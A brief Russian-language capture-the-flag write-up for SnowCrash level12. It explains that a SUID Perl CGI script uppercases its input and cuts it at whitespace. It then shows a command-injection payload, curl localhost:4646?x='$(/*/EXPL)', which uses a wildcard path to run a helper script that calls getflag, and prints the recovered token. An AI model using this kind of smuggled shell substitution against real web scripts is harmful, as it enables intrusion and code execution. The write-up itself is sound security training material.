level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl

 На файле стоит SUID, а значит он должен выполнить getflag


level12@SnowCrash:~$ ./level12.pl
Content-type: text/html

..level12@SnowCrash:~$

По коду скрипта понятно, что нужно выполнить запрос с параметрами
Вся хитрость заключается в операторах perl
$xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;

Все символы первого аргумента переводятся в верхний регистр, поэтому все что нам нужно сделать это
запустить скрипт, который сможет запустится после всех преобразований

level12@SnowCrash:~$ vim /tmp/EXPL
level12@SnowCrash:~$ cat /tmp/EXPL
#!/bin/bash

/bin/getflag > /tmp/tok
level12@SnowCrash:~$

level12@SnowCrash:~$ curl localhost:4646?x='$(/*/EXPL)'
..level12@SnowCrash:~$ cat /tmp/tok
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
